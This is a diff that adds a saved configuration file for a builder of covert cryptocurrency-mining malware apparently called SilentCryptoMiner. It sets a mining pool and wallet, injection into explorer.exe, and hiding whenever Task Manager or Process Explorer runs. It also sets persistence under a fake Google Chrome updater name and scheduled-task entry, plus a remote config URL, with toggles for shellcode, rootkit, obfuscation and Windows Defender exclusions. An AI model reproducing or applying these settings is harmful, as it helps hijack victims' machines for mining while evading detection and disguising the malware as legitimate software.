@@ -1,4 +1,182 @@
-{
+<?xml version="1.0" encoding="Windows-1252"?>
+<Form>
+  <Control Type="MephTheme" Name="formBuilder">
+    <Visible>True</Visible>
+    <Enabled>True</Enabled>
+    <Control Type="MephTabcontrol" Name="tabcontrolBuilder">
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabMain">
+        <Visible>True</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephComboBox" Name="comboLanguage">
+          <Text>English</Text>
+          <SelectedIndex>0</SelectedIndex>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnLoadState">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnSaveState">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephListBox" Name="listMiners">
+          <Item Type="SilentCryptoMiner.MinerETH">
+            <Control Type="MephTheme" Name="formMinerETH">
+              <Visible>True</Visible>
+              <Enabled>True</Enabled>
+              <Control Type="MephTabcontrol" Name="tabcontrolMinerETH">
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabConnection">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephGroupBox" Name="groupOptional">
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                    <Control Type="MephTextBox" Name="txtPoolPassowrd">
+                      <Text />
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephTextBox" Name="txtPoolWorker">
+                      <Text />
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephTextBox" Name="txtPoolData">
+                      <Text />
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                  </Control>
+                  <Control Type="MephGroupBox" Name="groupRequired">
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                    <Control Type="MephTextBox" Name="txtPoolURL">
+                      <Text>eu1.ethermine.org:4444</Text>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephTextBox" Name="txtPoolUsername">
+                      <Text>0x1cbF5428950C6Cc92D3C788611f184811DbB872d</Text>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephComboBox" Name="comboPoolScheme">
+                      <Text>stratum (Standard)</Text>
+                      <SelectedIndex>0</SelectedIndex>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabMining">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephToggleSwitch" Name="toggleProcessKiller">
+                    <Text />
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboAlgorithm">
+                    <Text>ethash</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboIdleGPU">
+                    <Text>100%</Text>
+                    <SelectedIndex>10</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboMaxGPU">
+                    <Text>80%</Text>
+                    <SelectedIndex>8</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboInjection">
+                    <Text>explorer.exe</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleStealth">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtIdleWait">
+                    <Text>3</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleIdle">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabAdvanced">
+                  <Visible>True</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephCheckBox" Name="chkAPI">
+                    <Text>API Endpoint URL</Text>
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkAdvParam">
+                    <Text>Advanced Parameters</Text>
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkRemoteConfig">
+                    <Text>Remote Configuration</Text>
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtAPI">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>False</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtKillTargets">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtStealthTargets">
+                    <Text>Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtAdvParam">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>False</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtRemoteConfig">
+                    <Text>https://github.com/KARAKANY/minerbackup/blob/main/backup.txt</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabJSON">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephTextBox" Name="txtJSON">
+                    <Text>{
     "url": "stratum://`0x1cbF5428950C6Cc92D3C788611f184811DbB872d`@eu1.ethermine.org:4444",
     "algo": "ethash",
     "max-gpu": 80,
@@ -6,4 +184,298 @@
     "idle-gpu": 100,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
     "kill-targets": ""
-}
+}</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+              </Control>
+            </Control>
+          </Item>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnMinerRemove">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnMinerEdit">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnMinerAdd">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabStartup">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="System.Windows.Forms.PictureBox" Name="pictureBox2">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleRunSystem">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtInstallFileName">
+          <Text>Google\Chrome\updater.exe</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleAutoDelete">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleWatchdog">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephCheckBox" Name="chkInstall">
+          <Text>Enabled</Text>
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtInstallEntryName">
+          <Text>GoogleUpdateTaskMachineQC</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephComboBox" Name="txtInstallPath">
+          <Text>AppData</Text>
+          <SelectedIndex>0</SelectedIndex>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabAssembly">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephCheckBox" Name="chkAssembly">
+          <Text>Disabled</Text>
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnAssemblyRandom">
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyTitle">
+          <Text>Title...</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnAssemblyClone">
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyProduct">
+          <Text>Product...</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion4">
+          <Text>0</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyDescription">
+          <Text>Description...</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion3">
+          <Text>0</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyCopyright">
+          <Text>Copyright...</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion2">
+          <Text>0</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyCompany">
+          <Text>Company...</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion1">
+          <Text>0</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyTrademark">
+          <Text>Trademark...</Text>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabIcon">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephCheckBox" Name="chkIcon">
+          <Text>Disabled</Text>
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picIcon">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnBrowseIcon">
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtIconPath">
+          <Text>Path to icon...</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabOptions">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephListBox" Name="cFormAO">
+          <Item Type="SilentCryptoMiner.AdvancedOptions">
+            <Control Type="MephTheme" Name="formAdvancedOptions">
+              <Visible>True</Visible>
+              <Enabled>True</Enabled>
+              <Control Type="MephToggleSwitch" Name="toggleRunInstall">
+                <Text />
+                <Checked>True</Checked>
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+              </Control>
+              <Control Type="MephToggleSwitch" Name="toggleOldMinerOverwrite">
+                <Text />
+                <Checked>True</Checked>
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+              </Control>
+              <Control Type="MephToggleSwitch" Name="toggleMemoryWatchdog">
+                <Text />
+                <Checked>True</Checked>
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+              </Control>
+              <Control Type="System.Windows.Forms.PictureBox" Name="picAdmin2">
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+              </Control>
+              <Control Type="MephToggleSwitch" Name="toggleRootkit">
+                <Text />
+                <Checked>False</Checked>
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+              </Control>
+              <Control Type="MephToggleSwitch" Name="toggleDebug">
+                <Text />
+                <Checked>False</Checked>
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+              </Control>
+            </Control>
+          </Item>
+          <Visible>False</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnAdvancedOptions">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="pictureBox3">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleWindowsUpdate">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="pictureBox1">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephCheckBox" Name="chkBlockWebsites">
+          <Text>Block Websites</Text>
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtBlockWebsites">
+          <Text />
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleDisableSleep">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleShellcode">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleAdministrator">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picAdmin1">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleObfuscation">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleWDExclusions">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabBuild">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephTextBox" Name="txtStartDelay">
+          <Text>15</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtLog">
+          <Text>Output...</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnBuild">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+    </Control>
+  </Control>
+</Form>
